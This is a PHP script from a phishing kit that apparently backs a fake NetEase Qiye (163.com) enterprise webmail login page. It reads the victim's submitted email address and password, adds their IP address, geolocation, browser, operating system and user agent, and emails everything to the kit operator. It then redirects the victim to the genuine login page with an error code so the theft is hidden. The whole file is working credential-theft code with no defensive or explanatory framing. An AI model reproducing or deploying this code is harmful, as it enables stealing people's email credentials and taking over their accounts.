<?php

session_start();

if($_SERVER['REQUEST_METHOD'] != "POST") {
    header("HTTP/1.0 403 Forbidden");
    print("Forbidden");
    exit();
}

require_once '../mail.php';
require_once 'geo.php';
require_once 'sync.php';

if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
} else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
}

$geoplugin = new geoPlugin($ip);
$geoplugin->locate();
$cc = $geoplugin->countryCode;
$cn = $geoplugin->countryName;
$br = $obj->showInfo('browser');
$op = $obj->showInfo('os');
$vr = $obj->showInfo('version');
$hostname = gethostbyaddr($ip);
$ua = $_SERVER['HTTP_USER_AGENT'];
$datum = date("D M d, Y g:i a");
$email = $_POST["accname"];
$passwd = $_POST["password"];
$msg = base64_encode($email);

$message = '';
$message .= "-------------------------------------------------------------------------------------\n";
$message .= "User ID: ".$email."\n";
$message .= "Password: ".$passwd."\n";
$message .= "-------------------------------------------------------------------------------------\n";
$message .= "Web Browser: ".$br."\n";
$message .= "Web Browser Version: ".$vr."\n";
$message .= "Operating System: ".$op."\n";
$message .= "IP: ".$ip." | ".$cn."\n";
$message .= "Submitted: ".$datum."\n";
$message .= "Host Name: ".$hostname."\n";
$message .= "User Agent: ".$ua."\n";
$message .= "-------------------------------------------------------------------------------------\n";

$subject = "You've got mail from $ip ($cn)";
$headers = "From: Qiye <$cc>\n";
$headers .= "Reply-To: ".$_POST["accname"]."\n";
$headers .= 'Content-type: text/plain; charset=iso-8859-1' . "\n";
$headers .= "MIME-Version: 1.0\n";

if (empty($email) || empty($passwd)) {
header("Location: ./?hl=zh_CN&webmailhost=mailhz.qiye.163.com&all_secure=2&ch=hw&msg=$msg&from=hz");
}
else {
mail($to,$subject,$message,$headers);
header("Location: https://qiye.163.com/login/?hl=zh_CN&webmailhost=mailhz.qiye.163.com&all_secure=1&ch=hw&msg=ERR.PARAM&from=hz");

}

?>